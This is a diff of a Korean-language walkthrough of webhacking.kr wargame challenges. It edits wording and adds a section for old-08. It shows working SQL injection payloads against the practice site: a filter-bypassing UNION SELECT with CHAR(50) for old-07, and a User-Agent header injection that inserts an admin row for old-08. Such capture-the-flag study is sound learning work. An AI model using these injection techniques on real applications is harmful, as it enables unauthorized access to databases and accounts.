@@ -102,7 +102,7 @@ login으로 들어가면 다음과 같이 mem 디렉터리가 노출되며 디�
 
 ![05-mem](./pic/05-mem.PNG)
 
-join.php의 소스코드를 보면 암호화가 되있다.
+join.php의 소스코드를 보면 암호화가 되어 있다.
 ```javascript
 <script>
 l='a';ll='b';lll='c';llll='d';lllll='e';llllll='f';lllllll='g';llllllll='h';lllllllll='i';llllllllll='j';lllllllllll='k';llllllllllll='l';lllllllllllll='m';llllllllllllll='n';lllllllllllllll='o';llllllllllllllll='p';lllllllllllllllll='q';llllllllllllllllll='r';lllllllllllllllllll='s';llllllllllllllllllll='t';lllllllllllllllllllll='u';llllllllllllllllllllll='v';lllllllllllllllllllllll='w';llllllllllllllllllllllll='x';lllllllllllllllllllllllll='y';llllllllllllllllllllllllll='z';I='1';II='2';III='3';IIII='4';IIIII='5';IIIIII='6';IIIIIII='7';IIIIIIII='8';IIIIIIIII='9';IIIIIIIIII='0';li='.';ii='<';iii='>';lIllIllIllIllIllIllIllIllIllIl=lllllllllllllll+llllllllllll+llll+llllllllllllllllllllllllll+lllllllllllllll+lllllllllllll+ll+lllllllll+lllll;
@@ -111,8 +111,8 @@ lIIIIIIIIIIIIIIIIIIl=llll+lllllllllllllll+lll+lllllllllllllllllllll+llllllllllll
 </script>
 ```
 
-코드를 조금예쁘게 정리해 보자. https://beautifier.io/  
-js beautifulier와 console 이용해서 해석해보면 다음과 같다.
+코드를 예쁘게 정리해 보자. https://beautifier.io/  
+js beautifulier와 개발자 도구를 이용해서 해석해보면 다음과 같다.
 ```javascript
 <script>
     if (document.cookie.indexOf(oldzombie) == -1) {
@@ -136,7 +136,7 @@ admin으로 로그인해야 하는데 이는 이미 있는 id라고 나온다. m
 
 ## old-06
 
-### base64
+___base64___
 
 소스코드를 요약하면,20번 base64 인코딩하고 규칙대로 replace한 값인 user 쿠키와 password 쿠키의 값을 거꾸로 replace하고 20번 base64 디코딩한 값이 각각 admin, nimda와 같으면 풀린다.   
 쿠키에 들어갈 값을 만들어보자.  
@@ -150,7 +150,7 @@ __exploit__: [old-06.py](./code/old-06.py)
 
 ## old-07
 
-### SQL 인젝션
+___SQL 인젝션 ___
 
 ```php
 <?php
@@ -184,8 +184,61 @@ elseif($data[0]==2){
 `if(preg_match("/2|-|\+|from|_|=|\\s|\*|\//i",$go)) exit("Access Denied!");`
 
 1. 띄어쓰기가 안된다. 정규표현식이 공백(\s)을 막고 있으므로 괄호를 사용해야 할듯하다.
-2. 2를 사용하지 못한다. 정규표현식이 사칙연산과 2를 막고 있으므로 2를 직접적으로 입력하지 못한다. 따라서 char(50)등의 방법으로 우회해봐야 할듯하다.
+2. 2를 사용하지 못한다. 정규표현식이 사칙연산과 2를 막고 있으므로 2를 직접적으로 입력하지 못한다. 따라서 char(50)등의 방법으로 우회해봐야 할듯하다.  
    
-결국 `val=0)UNION(SELECT(CHAR(50))` 과 같이 작성해서 5번정도 새로고침했더니 성공.
+결국 `val=0)UNION(SELECT(CHAR(50))` 과 같이 작성해서 5번정도 새로고침했더니 성공.  
 
 ![pwned](./pwned/old-07.PNG)
+
+<br>
+
+## old-08
+
+___SQL 인젝션___
+
+```PHP
+<?php
+...
+$result = mysqli_query($db,"select id from chall8 where agent='".addslashes($_SERVER['HTTP_USER_AGENT'])."'");
+$ck = mysqli_fetch_array($result);
+
+if($ck){
+  echo "hi <b>".htmlentities($ck[0])."</b><p>";
+  if($ck[0]=="admin"){
+    mysqli_query($db,"delete from chall8");
+    solve(8);
+  }
+}
+
+if(!$ck){
+  $q=mysqli_query($db,"insert into chall8(agent,ip,id) values('{$agent}','{$ip}','guest')") or die("query error");
+  echo("<br><br>done!  ({$count_ck[0]}/70)");
+}
+?>
+```
+소스코드를 확인하니 HTTP_USER_AGENT 값을 이용해서 SQL 쿼리문을 작성하였다.
+id에 admin이 있으면 solve, 없으면 agent를 이용해 INSERT를 하므로, 프록시 도구(burp suite)를 이용해 User-Agent 값을 `dummyagent', 'dummyip', 'admin'), ('0` 으로 바꿔주었다.
+
+![08-insert](./pic/08-insert.PNG)
+
+이는 실제 INSERT문에서는 다음과 같이 동작할 것이다.
+
+```SQL 
+INSERT INTO chall8(agent,ip,id) VALUES('dummyagent', 'dummyip', 'admin'), ('0', '{$ip}', 'guest')
+```
+
+따라서 뒷부분의 원래 쿼리는 '0'으로 추가되지 않고, 앞부분의 (dummyagent, dummyip, admin)만 성공적으로 추가된다.
+
+![08-done](./pic/08-done.PNG)
+
+이다음 agent를 insert한 값인 dummyagent로 바꿔주면 성공.
+
+![08-select](./pic/08-select.PNG)
+
+![pwned](./pwned/old-08.PNG)
+
+<br>
+
+# old-09
+
+______
